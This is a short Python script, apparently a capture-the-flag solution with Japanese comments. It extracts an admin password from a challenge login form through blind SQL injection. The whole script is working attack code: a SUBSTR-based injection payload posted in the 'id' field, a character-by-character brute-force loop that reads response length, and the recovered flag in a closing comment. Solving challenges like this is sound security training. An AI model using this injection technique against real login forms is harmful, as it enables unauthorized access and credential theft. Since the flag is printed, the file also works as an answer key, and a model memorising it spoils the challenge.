import requests

url = 'http://ctfq.sweetduet.info:10080/~q6/'

pass_len = 21
password = ''

# 1.1文字ずつ順番に調べる
for i in range(1, pass_len + 1):
    # 2.対象の1文字を0~{ まで調べる
    for char_number in range(48,123):
        check_chr = chr(char_number)
        # ? \'{check_chr}\'はstr比較を行うため必要である
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{check_chr}\' --'.format(
            index = i,check_chr= check_chr
        )
        print(sql)
        payload = {
            'id': sql,
            'pass': ''
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000:
            print(check_chr,end="")
            password += check_chr
            break
print()
print(password)

# result
# FLAG_KpWa4ji3uZk6TrPK
